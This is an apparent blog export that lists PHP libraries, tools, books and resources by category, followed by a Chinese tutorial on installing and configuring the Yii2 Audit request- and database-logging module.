testing framework with built-in stub, mock and code-coverage support. Mink - Web acceptance testing. Mockery - A mock object library for testing. ParaTest - A parallel testing library for PHPUnit. Peridot - An event driven test framework. Phake - Another mock object library for testing. Pho - Another behaviour driven development testing framework. PHP-Mock - A mock library for built-in PHP functions (e.g. time()). PHPSpec - A design by specification unit testing library. PHPT - A test tool used by PHP itself. PHPUnit - A unit testing framework. Prophecy - A highly opinionated mocking framework. Samsui - Another fake data generator library. VFS Stream - A virtual filesystem stream wrapper for testing. VFS - Another virtual filesystem for testing. Continuous IntegrationLibraries and applications for continuous integration. CircleCI - A continuous integration platform. GitlabCi - Let GitLab CI test, build, deploy your code. TravisCi like. Jenkins - A continous integration platform with PHP support. JoliCi - A continuous integration client written in PHP and powered by Docker. PHPCI - An open source continuous integration platform for PHP. SemaphoreCI - A continuous integration platform for open source and private projects. Shippable - A docker based continious integration platform for open source and private projects. Sismo - A continuous testing server library. Travis CI - A continuous integration platform. Wercker - A continuous integration platform DocumentationLibraries for generating project documentation. APIGen - Another API documentation generator. daux.io - A documentation generator which uses Markdown files. PHP Documentor 2 - A documentation generator. phpDox - A documentation generator for PHP projects (that is not limited to API documentation). Sami - An API documentation generator. SecurityLibraries for generating secure random numbers, encrypting data and scanning for vulnerabilities. Halite - A simple library for encryption using libsodium. HTML Purifier - A standards compliant HTML filter. IniScan - A tool that scans PHP INI files for security. Optimus - Id obfuscation based on Knuth’s multiplicative hashing method. PHP Encryption - Secure PHP Encryption Library. PHP IDS - A structured PHP security layer. PHP SSH - An experimental object orientated SSH wrapper library. PHPSecLib - A pure PHP secure communications library. random_compat - PHP 5.x support for random_bytes() and random_int() RandomLib - A library for generating random numbers and strings. SecurityMultiTool - A PHP security library. SensioLabs Security Check - A web tool to check your Composer dependencies for security advisories. TCrypto - A simple encrypted key-value storage library. VAddy - A continuous security testing platform for web applications. Zed - An integrated penetration testing tool for web applications. PasswordsLibraries and tools for working with and storing passwords. GenPhrase - A library for generating secure random passphrases. Password Compat - A compatibility library for the new PHP 5.5 password functions. Password Policy - A password policy library for PHP and JavaScript. Password Validator - A library for validating and upgrading password hashes. Password-Generator - PHP library to generate random passwords. PHP Password Lib - A library for generating and validating passwords. phpass - A portable password hashing framework. Zxcvbn PHP - A realistic PHP password strength estimate library based on Zxcvbn JS. Code AnalysisLibraries and tools for analysing, parsing and manipulating codebases. Better Reflection - AST-based reflection library that allows analysis and manipulation of code Code Climate - An automated code review. PHP Parser - A PHP parser written in PHP. PHP Semantic Versioning Checker - A command line utility that compares two source sets and determines the appropriate semantic versioning to apply. PHPLOC - A tool for quickly measuring the size of a PHP project. PHPQA - A tool for running QA tools (phploc, phpcpd, phpcs, pdepend, phpmd, phpmetrics). Qafoo Quality Analyzer - A tool to visualize metrics and source code. Scrutinizer - A web tool to scrutinise PHP code. UBench - A simple micro benchmark library. Code QualityLibraries for managing code quality, formatting and linting. PHP CodeSniffer - A library that detects PHP, CSS and JS coding standard violations. PHP CS Fixer - A coding standards fixer library. PHP Mess Detector - A library that scans code for bugs, sub-optimal code, unused parameters and more. PHPCheckstyle - A tool to help adhere to certain coding conventions. PHPCPD - A library that detects copied and pasted code. Static AnalysisLibraries for performing static analysis of PHP code. Exakat - A static analysis engine for PHP. Mondrian - A code analysis tool using Graph Theory. phan - A static analyzer based on PHP 7+ and the php-ast extension. PHPCompatibility - A PHP compatibility checker for PHP CodeSniffer. PhpDependencyAnalysis - A tool to create customisable dependency graphs. PHP Metrics - A static metric library. PHP Migration - A static analyzer for PHP version migration. PHPStan - A PHP Static Analysis Tool. Pslam - A static analysis tool for finding errors in PHP applications. ArchitecturalLibraries related to design patterns, programming approaches and ways to organize code. Compose - A function composition library. Design Patterns PHP - A repository of software patterns implemented in PHP. Finite - A simple PHP finite state machine. Functional PHP - A functional programming library. Galapagos - Evolutionary language transformation. Iter - A library that provides iteration primitives using generators. Monad PHP - A simple Monad library. Patchwork - A library for redefining userland functions. PHP Option - An option type library. Pipeline - A pipeline pattern implementation. Ruler - A simple stateless production rules engine. RulerZ - A powerful rule engine and implementation of the Specification pattern. Debugging and ProfilingLibraries and tools for debugging and profiling code. APM - Monitoring extension collecting errors and statistics into SQLite/MySQL/StatsD. Barbushin PHP Console - Another web debugging console using Google Chrome. Blackfire.io - A low-overhead code profiler. Kint - A debugging and profiling tool. PHP Console - A web debugging console. PHP Debug Bar - A debugging toolbar. PHPBench - A benchmarking Framework. Tideways.io - Monitoring and profiling tool Tracy - A simple error detection, logging and time measuring library. xDebug - A debug and profile tool for PHP. XHProf - A profiling tool originally developed by Facebook. Z-Ray - A debug and profile tool for Zend Server. Build ToolsProject build and automation tools. Bob - A simple project automation tool. Box - A utility to build PHAR files. Construct - A PHP project/micro-package generator. Phake - A rake PHP clone library. Phing - A PHP project build system inspired by Apache Ant. Task RunnersLibraries for automating and running tasks. Bldr - A PHP Task runner built on Symfony components. Jobby - A PHP cron job manager without modifying crontab. Robo - A PHP Task runner with object-orientated configurations. Task - A pure PHP task runner inspired by Grunt and Gulp. NavigationTools for building navigation structures. KnpMenu - A menu library. Asset ManagementTools for managing, compressing and minifying website assets. JShrink - A JavaScript minifier library. Munee - An asset optimiser library. Puli - A library for determining assets absolute paths. BowerPHP - A PHP implementation of Bower. A package manager for the web GeolocationLibraries for geocoding addresses and working with latitudes and longitudes. GeoCoder - A geocoding library. GeoJSON - A GeoJSON implementation. GeoTools - A library of geo-related tools. PHPGeo - A simple geo library. Date and TimeLibraries for working with dates and times. CalendR - A calendar management library. Carbon - A simple DateTime API extension. Chronos - A DateTime API extension supporting both mutable and immutable date/time. Moment.php - Moment.js inspired PHP DateTime handler with i18n support. Yasumi - An library to help you calculate the dates and names of holidays. EventLibraries that are event-driven or implement non-blocking event loops. Amp - An event driven non-blocking I/O library. Broadway - An event source and CQRS library. Cake Event - An event dispatcher library (CP). Elephant.io - Yet another web socket library. Evenement - An event dispatcher library. Event - An event library with a focus on domain events. Hoa EventSource - An event source library. Hoa WebSocket - Another web socket library. Prooph Event Store - An event source component to persist event messages Ratchet - A web socket library. React - An event driven non-blocking I/O library. Rx.PHP - A reactive extension library. Workerman - An event driven non-blocking I/O library. LoggingLibraries for generating and working with log files. Monolog - A comprehensive logger. E-commerceLibraries and applications for taking payments and building online e-commerce stores. Money - A PHP implementation of Fowler’s money pattern. OmniPay - A framework agnostic multi-gateway payment processing library. Payum - A payment abstraction library. Shopware - Highly customizable e-commerce software Swap - An exchange rates library. Sylius - An open source e-commerce solution. PDFLibraries and software for working with PDF files. Dompdf - A HTML to PDF converter. PHPPdf - A library for generating PDFs and images from XML. Snappy - A PDF and image generation library. WKHTMLToPDF - A tool to convert HTML to PDF. OfficeLibraries for working with office suite documents. ExcelAnt - A library for manipulating Microsoft Excel documents. PHPPowerPoint - A library for working with Microsoft PowerPoint Presentations. PHPWord - A library for working with Microsoft Word documents. PHPSpreadsheet - A pure PHP library for reading and writing spreadsheet files (successor of PHPExcel) DatabaseLibraries for interacting with databases using object-relational mapping (ORM) or datamapping techniques. Atlas.Orm - A data mapper implementation for your persistence model in PHP. Aura.Sql - Provides an extension to the native PDO along with a profiler and connection locator. Aura.SqlQuery - Independent query builders for MySQL, PostgreSQL, SQLite, and Microsoft SQL Server. Baum - A nested set implementation for Eloquent. Cake ORM - Object-Relational Mapper, implemented using the DataMapper pattern (CP). Doctrine Extensions - A collection of Doctrine behavioural extensions. Doctrine - A comprehensive DBAL and ORM. Eloquent - A simple ORM (L5). LazyRecord - A fast ORM designed for simplicity, extendability and performance. Pomm - An Object Model Manager for PostgreSQL. Propel - A fast ORM, migration library and query builder. ProxyManager - A set of utilities to generate proxy objects for data mappers. RedBean - A lightweight, configuration-less ORM. Spot2 - A MySQL datamapper ORM. MigrationsLibraries to help manage database schemas and migrations. Doctrine Migrations - A migration library for Doctrine. Migrations - A migration management library. Phinx - Another database migration library. PHPMig - Another migration management library. Ruckusing - Database migrations for PHP ala ActiveRecord Migrations with support for MySQL, Postgres, SQLite. NoSQLLibraries for working with “NoSQL” backends. Monga - A MongoDB abstraction library. MongoQB - A MongoDB query builder library. PHPMongo - A MongoDB ORM. Predis - A feature complete Redis library. QueueLibraries for working with event and task queues. Bernard - A multibackend abstraction library. BunnyPHP - A performant pure-PHP AMQP (RabbitMQ) sync and also async (ReactPHP) library. Pheanstalk - A Beanstalkd client library. PHP AMQP - A pure PHP AMQP library. Tarantool Queue - PHP bindings for Tarantool Queue. Thumper - A RabbitMQ pattern library. SearchLibraries and software for indexing and performing search queries on data. Elastica - A client library for ElasticSearch. ElasticSearch PHP - The official client library for ElasticSearch. Solarium - A client library for Solr. Sphinx Search - Sphinx Search library provides SphinxQL indexing and searching features SphinxQL query builder - A query library for the Sphinx search engine. Command LineLibraries related to the command line. Aura.Cli - Provides the equivalent of request ( Context ) and response ( Stdio ) objects for the command line interface, including Getopt support, and an independent Help object for describing commands. Boris - A tiny PHP REPL. Cilex - A micro framework for building command line tools. CLI Menu - A library for building CLI menus. CLIFramework - A command-line framework supports zsh/bash completion generation, subcommands and option constraints. It also powers phpbrew. CLImate - A library for outputting colours and special formatting. Commando - Another simple command line opt parser. Cron Expression - A library to calculate cron run dates. GetOpt - A command line opt parser. GetOptionKit - Another command line opt parser. Hoa Console - Another command line library. OptParse - Another command line opt parser. Pecan - An event-driven, non-blocking shell. PsySH - Another PHP REPL. ShellWrap - A simple command line wrapper library. Authentication and AuthorizationLibraries for implementing user authentication and authorization. Aura.Auth - Provides authentication functionality and session tracking using various adapters. Hawk - A Hawk HTTP authentication library. SocialConnect Auth - An open source social sign (OAuth1\\OAuth2\\OpenID\\OpenIDConnect). Json Web Token - Json Tokens to authenticate and transmit information. OAuth 1.0 Client - An OAuth 1.0 client library. OAuth 2.0 Client - An OAuth 2.0 client library. OAuth2 Server - Another OAuth2 server implementation. OAuth2 Server - An OAuth2 authentication server, resource server and client library. Opauth - A multi-provider authentication framework. PHP oAuthLib - Another OAuth library. Sentinel Social - A library for social network authentication. Sentinel - A framework agnostic authentication &amp; authorisation library. TwitterOAuth - A Twitter OAuth library. TwitterSDK - A fully tested Twitter SDK. MarkupLibraries for working with markup. Cebe Markdown - An fast and extensible Markdown parser. Ciconia - Another Markdown parser that supports Github flavoured Markdown. CommonMark PHP - A Markdown parser which supports the full CommonMark spec. Decoda - A lightweight markup parser library. Emoji - A library that converts unicode characters and names into emoji images. HTML to Markdown - Converts HTML into Markdown. HTML5 PHP - An HTML5 parser and serializer library. Parsedown - Another Markdown parser. PHP Markdown - A Markdown parser. StringsLibraries for parsing and manipulating strings. Agent - A PHP desktop/mobile user agent parser, based on Mobiledetect. ANSI to HTML5 - An ANSI to HTML5 converter library. Color Jizz - A library for manipulating and converting colours. Device Detector - Another library for parsing user agent strings. Hoa String - Another UTF-8 string library. Jieba-PHP - A PHP port of Python’s jieba. Chinese text segmentation for natural language processing. Mobile-Detect - A lightweight PHP class for detecting mobile devices (including tablets). Patchwork UTF-8 - A portable library for working with UTF-8 strings. Slugify - A library to convert strings to slugs. SQL Formatter - A library for formatting SQL statements. Stringy - A string manipulation library with multibyte support. Text - A text manipulation library. UA Parser - A library for parsing user agent strings. URLify - A PHP port of Django’s URLify.js. UUID - A library for generating UUIDs. NumbersLibraries for working with numbers. ByteUnits - A library to parse, format and convert byte units in binary and metric systems. LibPhoneNumber for PHP - A PHP implementation of Google’s phone number handling library. Math - A library for working with large numbers. Numbers PHP - A library for working with numbers. PHP Conversion - Another library for converting between units of measure. PHP Units of Measure - A library for converting between units of measure. Filtering and ValidationLibraries for filtering and validating data. Aura.Filter - Provides tools to validate and sanitize objects and arrays. Cake Validation - Another validation library (CP). DMS Filter - An annotation filtering library. Filterus - A simple PHP filtering library. ISO-codes - A library for validating inputs according standards from ISO, International Finance, Public Administrations, GS1, Book Industry, Phone numbers &amp; Zipcodes for many countries MetaYaml - A schema validation library that supports YAML, JSON and XML. Respect Validation - A simple validation library. Upload - A library for handling file uploads and validation. Valitron - Another validation library. Volan - Another simplified validation library. APILibraries and web tools for developing APIs. API Platform - Expose in minutes an hypermedia REST API that embraces JSON-LD, Hydra format. Apigility - An API builder built with Zend Framework 2. Drest - A library for exposing Doctrine entities as REST resource endpoints. HAL - A Hypertext Application Language (HAL) builder library. Hateoas - A HATEOAS REST web service library. Negotiation - A content negotiation library. Restler - A lightweight framework to expose PHP methods as RESTful web API. wsdl2phpgenerator - A tool to generate PHP classes from SOAP WSDL files. CachingLibraries for caching data. Alternative PHP Cache (APC) - Open opcode cache for PHP. APIx Cache - A thin PSR-6 cache wrapper to various caching backends emphasising cache tagging and indexing. CacheTool - A tool to clear APC/opcode caches from the command line. Cake Cache - A caching library (CP). Doctrine Cache - A caching library. Metaphore - Cache slam defense using a semaphore to prevent dogpile effect. Stash - Another library for caching. Zend Cache - Another caching library (ZF2). Data Structure and StorageLibraries that implement data structure or storage techniques. Ardent - A library of data structures. Cake Collection - A simple collections library (CP). Collections - Collections Abstraction library for PHP. Fractal - A library for converting complex data structures to JSON output. Ginq - Another PHP library based on .NET’s LINQ. JsonMapper - A library that maps nested JSON structures onto PHP classes. Knapsack - Collection library inspired by Clojure’s sequences. PHP Collections - A simple collections library. PINQ - A PHP library based on .NET’s LINQ (Language Integrated Query). Porter - Data import abstraction framework. Serializer - A library for serialising and de-serialising data. Totem - A library to manage and create data changesets. YaLinqo - Yet Another LINQ to Objects for PHP. Zend Serializer - Another library for serialising and de-serialising data (ZF2). NotificationsLibraries for working with notification software. JoliNotif - A cross-platform library for desktop notification (support for Growl, notify-send, toaster, etc) Nod - A notification library (e.g., Growl). Notification Pusher - A standalone library for device push notifications. Notificato - A library for handling push notifications. Notificator - A lightweight notification library. Php-pushwoosh - A PHP Library to easily send push notifications with the Pushwoosh REST Web Services. DeploymentLibraries for project deployment. Deployer - A deployment tool. Envoy - A tool to run SSH tasks with PHP. Plum - A deployer library. Pomander - A deployment tool for PHP applications. Rocketeer - A fast and easy deployer for the PHP world. Internationalisation and LocalisationLibraries for Internationalization (I18n) and Localization (L10n). Aura.Intl - Provides internationalization (I18N) tools, specifically package-oriented per-locale message translation. Cake I18n - Message translation and localization for dates and numbers (CP) Third Party APIsLibraries for accessing third party APIs. Amazon Web Service SDK - The official PHP AWS SDK library. Campaign Monitor - The official Campaign Monitor PHP library. Digital Ocean - A library to interface with the Digital Ocean API. Dropbox SDK - The official PHP Dropbox SDK library. Github - A library to interface with the Github API. Mailgun The official Mailgun PHP API. PHP Github API - Another library to interface with the Github API. S3 Stream Wrapper - A stream wrapper library for Amazon S3. Stripe - The official Stripe PHP library. Twilio - The official Twilio PHP REST API. Twitter OAuth - A library to interface with Twitter’s OAuth workflow. Twitter REST - A library to interact with Twitter’s REST API. ExtensionsLibraries to help build PHP extensions. PHP CPP - A C++ library for developing PHP extensions. Zephir - A compiled language between PHP and C++ for developing PHP extensions. MiscellaneousUseful libraries or tools that don’t fit in the categories above. Annotations - An annotations library (part of Doctrine). BotMan - A framework agnostic PHP library to build cross-platform chat bots. Cake Utility - Utility classes such as Inflector, String, Hash, Security and Xml (CP). Chief - A command bus library. ClassPreloader - A library for optimising autoloading. Country List - A list of all countries with names and ISO 3166-1 codes. Embera - An Oembed consumer library. Essence - A library for extracting web media. Flux - A regular expression building library. Graphviz - A Graphviz library. Hprose-PHP - A very newbility RPC Library, support 25+ languages now. JSON Lint - A JSON lint utility. JSONPCallbackValidator - A library for validating JSONP callbacks. Jumper - A remote service executor library. LadyBug - A dumper library. Lambda PHP - A Lambda calculus interpreter in PHP. LiteCQRS - A CQRS (Command Query Responsibility Separation) library. Metrics - A simple metrics API library. noCAPTCHA - Helper for Google’s noCAPTCHA (reCAPTCHA). Nmap - A PHP wrapper around Nmap. Opengraph - An opengraph library. Pagerfanta - A pagination library. PHP Expression - A PHP expression language. PHP PassBook - A PHP library for iOS PassBook. PHP-GPIO - A library for playing with the Raspberry PI’s GPIO pins. PHP-ML - A library for Machine Learning in PHP. PHPCR - A PHP port of the Java Content Repository (JCR). PHPStack - A TCP/IP stack proof of concept written in PHP. print_o - An object graph visualizer. Procrastinator - A library for running time consuming tasks. Prooph Service Bus - Lightweight message bus supporting CQRS and Micro Services RMT - A library for versioning and releasing software. sabre/vobject - A library for parsing VCard and iCalendar objects. Slimdump - An easy dumper tool for MySQL. Spork - A process forking library. Sslurp - A library that makes dealing with SSL suck less. SuperClosure - A library that allows Closures to be serialized. Symfony VarDumper - A variable dumper component (SF). Underscore - A PHP port of the Underscore JS library. Whoops - A pretty error handling library. SoftwareSoftware for creating a development environment. PHP InstallationTools to help install and manage PHP on your computer. HomeBrew PHP - A PHP tap for HomeBrew. HomeBrew - A package manager for OSX. PHP Brew - A PHP version manager and installer. PHP Build - Another PHP version installer. PHP Env - Another PHP version manager. PHP OSX - A PHP installer for OSX. PHP Switch - Another version manager. VirtPHP - A tool for creating and managing isolated PHP environments. Development EnvironmentSoftware and tools for creating a sandboxed development environment. Ansible - A radically simple orchestration framework. Phansible - A web tool for building PHP development virtual machines with Ansible. Protobox - Another web tool for building PHP development virtual machines. PuPHPet - A web tool for building PHP development virtual machines. Puppet - A server automation framework and application. Vagrant - A portable development environment utility. Docker - A containerization platform. Virtual MachinesAlternative PHP virtual machines. Hack - A programming language for HHVM that interoperates seamlessly with PHP. HHVM - A Virtual Machine, Runtime and JIT for PHP by Facebook. HippyVM - Another PHP virtual machine. Text Editors and IDEsText Editors and Integrated Development Environments (IDE) with support for PHP. Atom - A hackable text editor. Atom IDE - An IDE extension for Atom. Eclipse for PHP Developers - A PHP IDE based on the Eclipse platform. Netbeans - An IDE with support for PHP and HTML5. PhpStorm - A commercial PHP IDE. VS Code - An open source code editor. Web ApplicationsWeb-based applications and tools. 3V4L - An online PHP &amp; HHVM shell. DBV - A database version control application. PHP Queue - An application for managing queueing backends. MailCatcher - A web tool for capturing and viewing emails. Cachet - The open source status page system. phpBeanstalkdAdmin - Monitoring and administration interface for Beanstalkd. phpRedisAdmin - A simple web interface to manage Redis databases. phpPgAdmin - A web-based administration tool for PostgreSQL. phpMyAdmin - A web interface for MySQL/MariaDB. Adminer - Database management in a single PHP file. Grav - A modern flat-file CMS. Lychee - An easy to use and great looking photo-management-system. InfrastructureInfrastructure for providing PHP applications and services. appserver.io - A multithreaded application server for PHP, written in PHP. php-pm - A process manager, supercharger and load balancer for PHP applications. ResourcesVarious resources, such as books, websites and articles, for improving your PHP development skills and knowledge. PHP WebsitesUseful PHP-related websites. Nomad PHP - A online PHP learning resource. PHP Best Practices - A PHP best practice guide. PHP FIG - The PHP Framework Interoperability Group. PHP Mentoring - Peer to peer PHP mentorship organization. PHP Package Development Standards - Package development standards for PHP. PHP School - Open Source Learning for PHP. PHP Security - A guide to PHP security. PHP The Right Way - A PHP best practice quick reference guide. PHP UG - A website to help people locate their nearest PHP user group (UG). PHP Versions - Lists which versions of PHP are available on several popular web hosts. PHP Weekly - A weekly PHP newsletter. PHPTrends - An overview of fastest growing PHP libraries. Securing PHP - A newsletter about PHP security and library recommendations. Seven PHP - A website that interviews members of the PHP community. PHP Annotated Monthly - A monthly digest of PHP news. Other WebsitesUseful websites related to web development. Atlassian Git Tutorials - A series of Git tutorials. Hg Init - A series of Mercurial tutorials. Learning Linux - A website for learning Linux. Semantic Versioning - A website explaining semantic versioning. Servers for Hackers - A newsletter about server management. The Open Web Application Security Project (OWASP) - An open software security community. WebSec IO - A web security community resource. PHP BooksFantastic PHP-related books. Functional Programming in PHP - This book will show you how to leverage these new PHP5.3+ features by understanding functional programming principles Grumpy PHPUnit - A book about unit testing with PHPUnit by Chris Hartjes. Mastering Object-Orientated PHP - A book about object-orientated PHP by Brandon Savage. Modern PHP New Features and Good Practices - A book about new PHP features and best practices by Josh Lockhart. Modernizing Legacy Applications in PHP - A book about modernizing legacy PHP applications by Paul M. Jones. PHP 7 Upgrade Guide - An ebook covering all of the features and changes in PHP 7 by Colin O’Dell. PHP Pandas - A book about learning to write PHP by Dayle Rees. Scaling PHP Applications - An ebook about scaling PHP applications by Steve Corona. Securing PHP: Core Concepts - A book about common security terms and practices for PHP by Chris Cornutt. Signaling PHP - A book about catching PCNTL signals in CLI scripts by Cal Evans. The Grumpy Programmer’s Guide to Building Testable PHP Applications - A book about building testing PHP applications by Chris Hartjes. XML Parsing with PHP - This book covers parsing and validating XML documents, leveraging XPath expressions, and working with namespaces as well as how to create and modify XML files programmatically. Domain-Driven Design in PHP - Real examples written in PHP showcasing DDD Architectural Styles. Other BooksBooks related to general computing and web development. Elasticsearch: The Definitive Guide - A guide to working with Elasticsearch by Clinton Gormley and Zachary Tong. Eloquent JavaScript - A book about JavaScript programming by Marijn Haverbeke. Head First Design Patterns - A book that expains software design patterns. Pro Git - A book about Git by Scott Chacon and Ben Straub. The Linux Command Line - A book about the Linux command line by William Shotts. The Tangled Web — Securing Web Applications - A book about securing web applications by Michal Zalewski. Understanding Computation - A book about computation theory by Tom Stuart. Vagrant Cookbook - A book about creating Vagrant environments by Erika Heidi. PHP VideosFantastic PHP-related videos. Nomad PHP Lightning Talks - 10 to 15 minute Lightning Talks by PHP community members. PHP UK Conference - A collection of videos from the PHP UK Conference. Programming with Anthony - A video series by Anthony Ferrara. Taking PHP Seriously - A talk outlining PHP’s strengths by Keith Adams of Facebook. PHP PodcastsPodcasts with a focus on PHP topics. PHP Town Hall - A casual PHP podcast by Ben Edmunds and Phil Sturgeon. Voices of the ElePHPant Interviews with the people that make the PHP community special. PHP Roundtable - The PHP Roundtable is a casual gathering of developers discussing topics that PHP nerds care about. Voices of the ElePHPant - Interviews with members of PHP community. PHP ReadingPHP-releated reading materials. Composer Primer - A Composer primer. Composer Stability Flags - An article about Composer stability flags. Composer Versioning - An article about Composer versioning. Create Your Own PHP Framework - A series of articles on how to make your own PHP framework by Fabien Potencier. Don’t Worry About BREACH - An article about the BREACH hack and CSRF tokens. On PHP 5.3, Lambda Functions and Closures - An article about lambda functions and closures. PHP Is Much Better Than You Think - An article about the PHP language and ecosystem. PHP Package Checklist - A checklist for successful PHP package development. PHP Sucks! But I Like It! - An article about the pros and cons of PHP. Preventing CSRF Attacks - An article on preventing CSRF attacks. Seven Ways to Screw Up BCrypt - An article about correct BCrypt implementation. Use Env - An article about using the unix environment helper. PHP Internals ReadingReading materials related to the PHP internals or performance. Disproving the Single Quotes Myth - An article about performance of single and double quoted strings. How Big Are PHP Arrays (And Values) Really? - An article about array internals. How Foreach Works - A detailed StackOverflow answer about foreach. How Long is a Piece of String - An article about string internals. PHP Evaluation Order - An article about evaluation order in PHP. PHP Internals Book - An online book about PHP internals, written by three core developers. PHP RFCs - The home of PHP RFCs (Request for Comments). Print vs Echo, Which One is Faster? - An article about print and echo performance. The PHP Ternary Operator. Fast or Not? - An article ternary performance. Understanding OpCodes - An article about opcodes. When Does Foreach Copy? - An article about the internals of foreach. Why Objects (Usually) Use Less Memory Than Arrays - An article about object and array internals. You’re Being Lied To - An article about internal ZVALs. Collecting Garbage: 1 2 3 - A series about the PHP garbage collection internals. PHP Source Code for Developers: 1 2 3 4 - A series about the PHP source code. PHP 杂志Fantastic PHP-related magazines. php[architect] - A monthly magazine dedicated to PHP.","categories":[{"name":"编程开发","slug":"develop","permalink":"https://war9.cn/categories/develop/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://war9.cn/tags/PHP/"},{"name":"学习资料","slug":"学习资料","permalink":"https://war9.cn/tags/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"},{"name":"PHP资源","slug":"PHP资源","permalink":"https://war9.cn/tags/PHP%E8%B5%84%E6%BA%90/"},{"name":"php组件","slug":"php组件","permalink":"https://war9.cn/tags/php%E7%BB%84%E4%BB%B6/"},{"name":"php框架","slug":"php框架","permalink":"https://war9.cn/tags/php%E6%A1%86%E6%9E%B6/"}],"author":"Joe shengxin"},{"title":"Yii2 Audit插件的使用【日志记录插件】","slug":"yii2-audit插件的使用","date":"2018-01-02T12:47:00.000Z","updated":"2021-02-18T13:06:57.082Z","comments":true,"path":"2018/01/02/yii2-audit插件的使用/","link":"","permalink":"https://war9.cn/2018/01/02/yii2-audit%E6%8F%92%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"Yii2 Audit 插件的使用 Yii2-Audit插件是一个功能齐全的，用于记录和显示web 、 cli请求、数据库更改、php /js错误和相关数据的插件。 并且该插件是以module的形式安装于Yii中，使用起来极为方便。 项目地址：https://github.com/bedezign/yii2-audit 文档地址：https://bedezign.github.io/yii2-audit/ 功能清单[点击可跳转到对应介绍] 【Entries】记录Web、Cli请求 (核心功能) 【Trails】记录数据库变更 【Javascripts】记录JavaScript错误记录 【Errors】记录Yii2错误记录 记录cURL请求 记录SOAP请求 记录请求中发送的邮件 数据可视化统计 1.安装 1.1 本插件依赖于PHP mail parse扩展,如若使用请安装php_mailparse 并修改php.ini 启用该扩展 1.2 使用Composer安装源文件 1composer require --prefer-dist bedezign&#x2F;yii2-audit:&quot;dev-master&quot; 1.3 导入数据库 1php yii migrate --migrationPath&#x3D;@bedezign&#x2F;yii2&#x2F;audit&#x2F;migrations 注意：导入前common/main-local里的数据库必须有一个名称为db的数据库配置。否则会报错。 1234567&#39;db&#39; &#x3D;&gt; [ &#39;class&#39; &#x3D;&gt; &#39;yii\\db\\Connection&#39;, &#39;dsn&#39; &#x3D;&gt; &#39;mysql:host&#x3D;localhost;port&#x3D;3306;dbname&#x3D;yii2-audit&#39;, &#39;username&#39; &#x3D;&gt; &#39;root&#39;, &#39;password&#39; &#x3D;&gt; &#39;&#39;, &#39;charset&#39; &#x3D;&gt; &#39;utf8&#39;,], 1.4 最简配置编辑config/main.php,在modules下加入：audit。更加完整的配置请查看链接 https://bedezign.github.io/yii2-audit/docs/module-configuration/123456&lt;?php$config = [ &#x27;modules&#x27; =&gt; [ &#x27;audit&#x27; =&gt; &#x27;bedezign\\yii2\\audit\\Audit&#x27;, ],]; 然后访问yourdomain.com/index.php?r=audit 即可查看访问详细情况。如图： 2.Audit功能使用介绍按照1.安装里面介绍的步骤，可能会出现没有权限访问的情况，那么接下来介绍如何配置该插件并详细介绍其功能。 2.1 【Entries】记录Web、Cli请求 记录字段如下: 记录字段名称 解释 其它说明 User 默认记录操作用户ID - IP 记录操作者IP - Request Method 请求方法 例如GET、POST、HEAD、PUT等 Ajax 是否是异步请求 - Route 请求的路由地址 - Duration 请求响应时长 - Memory 内存占用 - Created 请求时间 - 配置 ** 本功能是插件的核心功能，因此若要使用其它功能，必须先把这里配置好。** 完整配置请查看：https://bedezign.github.io/yii2-audit/docs/module-configuration/ 以下内容均为config/main.php配置文件的内容。 123456&#39;modules&#39; &#x3D;&gt; [ &#39;audit&#39; &#x3D;&gt; [ &#39;class&#39; &#x3D;&gt; &#39;bedezign\\yii2\\audit\\Audit&#39;, &#x2F;&#x2F;在此加入下文介绍的配置 ]] db 指定数据库连接在使用了多数据库后，可以通过以下配置来指定一个数据库链接。 1&#39;db&#39; &#x3D;&gt; &#39;myAuditDatabase&#39;, trackActions 要监听的action 1&#39;trackActions&#39; &#x3D;&gt; [&#39;*&#39;], &#x2F;&#x2F;监听全部action ignoreActions 要屏蔽的action，设置后将不在日志里记录这些action 1&#39;ignoreActions&#39; &#x3D;&gt; [&#39;audit&#x2F;*&#39;, &#39;debug&#x2F;*&#39;], &#x2F;&#x2F;设置不记录audit组件内的所有操作和debug路由下的所有操作 accessIps 允许访问audit组件的IP列表 1&#39;accessIps&#39; &#x3D;&gt; [&#39;127.0.0.1&#39;, &#39;192.168.*&#39;], &#x2F;&#x2F;允许本地IP和192.168.IP段下的IP访问。如果为null则允许任何人访问 accessRoles 允许访问的角色列表 1&#39;accessRoles&#39; &#x3D;&gt; [&#39;admin&#39;], &#x2F;&#x2F;设置角色为admin的角色可以访问audit组件。如果为null则允许任何人访问 accessUsers 允许访问的User ID列表。 1&#39;accessUsers&#39; &#x3D;&gt; [1,2], &#x2F;&#x2F;设置ID为1或2的用户可以访问audit组件，如果为null则允许任何人访问 maxAge 日志生命周期 单位：天 1&#39;maxAge&#39; &#x3D;&gt; &#39;debug&#39;, &#x2F;&#x2F;永不删除 compressData 压缩数据。 panels 日志数据面板 12345&#x27;panels&#x27; =&gt; [ &#x27;audit/request&#x27;, //显示请求内容面板 &#x27;audit/error&#x27;, //显示错误信息面板 &#x27;audit/trail&#x27;, //显示数据库信息面板], 支持的面板列表如下： RequestPanel //跟踪所有传入web和控制台的请求数据。 AssetPanel //显示载入的前端资源 ConfigPanel //Yii 和PHP配置 DbPanel //数据库查询信息 ErrorPanel //记录PHP异常、错误。 JavascriptPanel //自动记录JavaScript错误信息 LogPanel //Yii日志 MailPanel //邮件记录 这里必须开启PHP的PHPmail扩展，不然报错 ProfilingPanel //应用程序配置信息 TrailPanel //数据库变更记录 ExtraDataPanel //额外定义的数据 CurlPanel //记录应用的cURL请求。（包含响应，日志，和请求头） SOAPPanel //记录应用的SOAP请求 YourOwnPanel //自定义Panel 通过路由 yourdomain.com/audit/entry/index 查看Web、Cli请求记录。 在记录以上字段的同时，如果配置了【Trails】【Mails】【Javascripts】【Errors】，则会显示对应的，通过该请求造成的【Trails】记录ID，【Mails】记录ID，【Javascripts】记录ID和【Errors】记录ID。如图：在POST hly-base-info/create 的同时，影响了数据库，并且在HlyBaseInfomodel里配置了AuditTrailBehavior，因此会记录数据库变更。**数据库变更记录配置详见2.2** 这里的Trails ID只是本次请求，导致的所有数据库变更中的最后一个，并不是完整的ID数组，完整的数据库变更还是要在Trails里查看。如图 在此就可以看到数据库完整的变化，这里的Entry ID指向了对应的操作日志。 查看请求详细记录 通过上面的列表，点击最左侧图标进入详细查看。里面提供了类似Yii2 